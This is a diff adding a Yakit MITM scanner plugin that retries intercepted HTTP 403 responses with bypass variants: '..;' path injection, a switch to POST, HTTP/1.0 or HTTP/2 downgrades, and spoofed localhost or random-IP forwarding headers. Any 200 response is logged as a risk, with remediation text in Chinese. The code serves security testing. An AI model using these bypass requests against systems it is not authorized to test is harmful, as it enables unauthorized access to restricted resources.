@@ -1,0 +1,112 @@
+bypassPayload = "..;"
+
+versionMutate = (packet, feedback) => {
+    method, path, version = poc.GetHTTPPacketFirstLine(packet)
+    newPacket = poc.ReplaceHTTPPacketFirstLine(packet, "%v %v %v" % [method, path, "HTTP/1.0"])
+    feedback(newPacket)
+    newPacket = poc.ReplaceHTTPPacketFirstLine(packet, "%v %v %v" % [method, path, "HTTP/2"])
+    feedback(newPacket)
+}
+
+methodMutate = (packet, feedback) => {
+    method, path, version = poc.GetHTTPPacketFirstLine(packet)
+    newPacket = poc.ReplaceHTTPPacketFirstLine(packet, "POST %v %v" % [path, version])
+    feedback(newPacket)
+}
+
+ipFakerMutate = (packet, feedback) => {
+    Bypass403Header = {"X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1", "X-Client-IP": "127.0.0.1", "X-Forwarded-For": "127.0.0.1", "X-Forwared-Host": "127.0.0.1", "X-Host": "127.0.0.1", "X-Custom-IP-Authorization": "127.0.0.1"}
+    newPacket = packet
+    for k, v := range Bypass403Header {
+        newPacket = poc.ReplaceHTTPPacketHeader(newPacket, k, v)
+    }
+    
+    feedback(newPacket)
+
+    newPacket = packet
+    for k, v := range Bypass403Header {
+        newPacket = poc.ReplaceHTTPPacketHeader(
+            newPacket, 
+            k, 
+            x`{{randint(1,255)}}.{{randint(1,255)}}.{{randint(1,255)}}.{{randint(1,255)}}`[0], 
+        )
+    }
+    
+    feedback(newPacket)
+}
+
+pathMutate = (packet, feedback) => {
+    path = poc.GetHTTPRequestPath(packet)
+    originPath = path
+    if !path.HasPrefix("/") {
+        path = "/" + path
+    }
+    
+    if !path.HasSuffix("/") {
+        path = path + "/"
+    }
+    
+    base = -1
+    changePath = []
+    for i in path.Count("/") {
+        handledPath = path
+        if base >= 0 {
+            handledPath = string(path[base + 1:])
+        }
+        
+        idx = handledPath.IndexOf("/")
+        idx = base + 1 + idx
+        newPath = []
+        newPath.Push(path[:idx] + "..;" + path[idx:])
+        if len(path) <= idx + 1 {
+            newPath.Push(path[:idx + 1] + "..;")
+        } else {
+            newPath.Push(path[:idx + 1] + "..;" + path[idx + 1:])
+        }
+        
+        base = idx
+        changePath.Append(newPath...)
+    }
+    
+    method, originpath, version = poc.GetHTTPPacketFirstLine(packet)
+    for newPath in changePath {
+        newPacket = poc.ReplaceHTTPPacketFirstLine(packet, "%v %v %v" % [method, newPath, version])
+        feedback(newPacket)
+    }
+    
+}
+
+# mirrorFilteredHTTPFlow 劫持到的流量为 MITM 自动过滤出的可能和 "业务" 有关的流量，会自动过滤掉 js / css 等流量
+mirrorFilteredHTTPFlow = func(isHttps /* bool */, url /* string */, req /* []byte */, rsp /* []byte */, body /* []byte */) {
+    if poc.GetStatusCodeFromResponse(rsp) != 403 {
+        return
+    }
+
+    feedback = packet => {
+        defer recover()
+        packet = string(packet)
+        
+        newRsp, newReq, err =poc.HTTP(packet, poc.https(isHttps))
+        if err != nil {
+            yakit.Error("check %v failed: %v", url, err)
+            return
+        }
+        if poc.GetStatusCodeFromResponse(newRsp) == 200 {
+            risk.NewRisk(
+                url, 
+                risk.severity("warning"),
+                risk.title("Potential 403 Bypass: "+url), 
+                risk.titleVerbose("潜在403绕过："+url), 
+                risk.request(newReq), risk.response(newRsp),
+                risk.type("unauth-access"),
+                risk.description("HTTP 403 Forbidden 绕过漏洞是一种 Web 安全漏洞，攻击者通过修改 HTTP 请求的特定参数或使用特殊技术，能够访问被服务器明确禁止访问的资源。这种漏洞通常源于服务器端访问控制实现不当或配置错误。"),
+                risk.solution(`要解决 403 Forbidden 绕过漏洞，应采取多层防御策略：在服务器层面严格配置访问控制和 URL 规范化；在应用程序层面实现统一的认证授权机制和严格的路径验证；同时加强安全监控、日志记录和定期审计，并保持系统及时更新和补丁。关键在于建立全面、严格且一致的访问控制体系，消除可能被利用的技术漏洞和配置缺陷。`)
+            )
+        }
+    }
+
+    pathMutate(req, feedback)
+    methodMutate(req, feedback)
+    versionMutate(req, feedback)
+    ipFakerMutate(req, feedback)
+}
